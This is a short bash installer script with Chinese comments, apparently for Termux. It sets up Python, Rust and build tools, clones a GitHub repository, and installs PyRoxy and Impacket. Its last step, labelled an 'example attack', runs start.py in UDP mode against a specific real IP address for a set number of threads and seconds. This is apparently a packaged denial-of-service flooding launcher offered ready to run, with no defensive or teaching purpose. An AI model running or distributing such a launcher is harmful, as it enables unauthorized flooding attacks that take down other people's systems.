#!/bin/bash

# 使用 bash 运行此脚本
if [ -z "$BASH_VERSION" ]; then
    echo "请使用 bash 运行此脚本" >&2
    exit 1
fi

# 更新软件包列表
echo "正在更新软件包列表..."
pkg update -y

# 安装必要的软件和 Rust 编译器
echo "正在安装 Python、Clang、OpenSSL、Git 和 Rust..."
pkg install python clang openssl git rust -y

# 安装 OpenSSL 工具
pkg install openssl-tool -y

# 检查 Python 是否安装成功
if ! command -v python3 >/dev/null 2>&1; then
    echo "Python 未正确安装。" >&2
    exit 1
fi

# 创建并激活 Python 虚拟环境
echo "正在创建并激活 Python 虚拟环境..."
python3 -m venv venv
source venv/bin/activate

# 设置清华 PyPI 镜像源
echo "正在配置清华大学 PyPI 镜像源..."
pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple

# 更新 pip
echo "正在更新 pip..."
pip install --upgrade pip

# 克隆 GitHub 项目
echo "正在克隆 GitHub 项目..."
git clone https://github.com/kkkmnss/1.git
cd 1

# 尝试安装所有依赖为二进制
echo "正在安装项目依赖（尽可能使用二进制）..."
pip install --only-binary :all: -r requirements.txt

# 安装 PyRoxy 和 Impacket 模块（这些可能需要从源码编译）
echo "正在安装 PyRoxy 和 Impacket 模块..."
pip install git+https://github.com/MatrixTM/PyRoxy.git
pip install git+https://github.com/SecureAuthCorp/impacket.git

# 进行示例攻击
echo "开始示例攻击..."
python3 start.py UDP 166.88.95.146 10 10

# 保持 shell 开启并在虚拟环境中
echo "现在你在虚拟环境中，可以自由地运行其他命令。"
exec /bin/bash
